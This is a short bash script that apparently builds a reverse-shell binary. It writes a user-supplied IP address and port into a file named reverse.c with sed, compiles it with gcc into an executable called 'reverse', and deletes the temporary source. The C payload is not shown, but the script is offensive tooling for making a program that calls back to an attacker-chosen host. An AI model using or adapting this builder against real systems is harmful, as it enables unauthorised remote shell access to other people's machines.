if [[ $1 == "" ]] && [[ $2 == "" ]]; then
	echo "Usage: $0 [IP] [PORT]"
	exit
fi

sed "s#IP#$1#" reverse.c | sed "s#PORT#$2#" | tee tmp.c
gcc tmp.c -o reverse && echo "./reverse generated"
rm tmp.c
